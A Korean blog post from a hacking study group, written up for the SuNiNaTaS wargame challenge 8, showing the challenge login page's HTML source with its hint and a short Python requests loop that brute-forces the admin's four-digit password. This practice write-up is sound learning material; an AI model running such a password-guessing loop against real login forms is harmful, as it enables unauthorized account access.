---
layout: default
title: Day24
nav_order: 3

parent: Hacking Project - W4
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
-----

# > http://suninatas.com/

## challenge 8

![image-20220511183914297](../img/image-20220511183914297.png)

가장 기초적인 브루트포싱 관련 문제임을 페이지를 보자마자 직감했다.  
그리고 페이지 소스를 확인하였더니 아래와 같았다.


```html
<!DOCTYPE html>

<html>
<head>
    <title>Game 08</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="shortcut icon" href="/static/img/game.ico" />
</head>
<body>
    <form method="post" action="./web08.asp">
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <table width="240" cellpadding="0" cellspacing="0" align="center">
            <tr height="30">
                <td width="50%" class="table_top" align="center">
                    <input type="button" name="main_btn" value="main" style="width: 60" onclick="location.href = '/'"></td>
                <td width="50%" class="table_top" align="center">
                    <input type="button" name="main_btn" value="Back" style="width: 60" onclick="history.back()"></td>
            </tr>
            <tr height="30" class="table_main">
                <td width="120" align="center" bgcolor="cccccc"><font size="2"><b>ID</b></font></td>
                <td width="120" align="center" bgcolor="cccccc">
                    <input type="text" name="id" style="width: 90"></td>
            </tr>
            <tr height="30" class="table_main">
                <td align="center" bgcolor="cccccc"><font size="2"><b>PW</b></font></td>
                <td align="center" bgcolor="cccccc">
                    <input type="password" name="pw" style="width: 90" maxlength="4"></td>
            </tr>
            <tr height="30">
                <td colspan="2" align="center" class="table_top" bgcolor="cccccc">
                    <input type="button" name="btn" value="Login" onclick="submit()" size="20"></td>
            </tr>
            <tr class="table_main" height="30">
                <td colspan="2" align="center" bgcolor="cccccc">Password Incorrect!</td>
            </tr>
        </table>
    </form>
</body>
</html>


<!-- Hint : Login 'admin' Password in 0~9999 -->
<!-- M@de by 2theT0P -->

```

힌트에서도 의미하듯이 브루트포싱 문제 같았고 기존에 알고 있던 파이썬의 request 패키지를 이용하여 POST 형식으로 요청 및 응답을 진행하기로 했다. 또한 내가 전달한 비밀번호가 맞는지 판별하는 기준을 " Incorrect! " 단어로 지정함으로써 응답 패킷에 해당 단어가 없으면 정답인 것으로 했다.

사용한 코드는 아래와 같다

```python
import requests
url = 'http://suninatas.com/challenge/web08/web08.asp'

for i in range(1,10000):
	params = {
		'id':'admin',
		'pw':str(i)
	}
	response = requests.post(url,params)
	if 'Incorrect' in response.text:
		print(str(i))
	else:
		print(str(i))
		break
```

POST 방식으로 전달할 때에는 위와 같이 파라미터값을 설정하여 보낸다.  
이 때 웹 페이지에서 `name` 속성으로 지정한 값이 `id`와 `pw` 임을 확인하고 해당 속성 값을 전달해야 한다.  
만약 GET 방식이였다면 url에 포함하여 전달하였을 것이다.
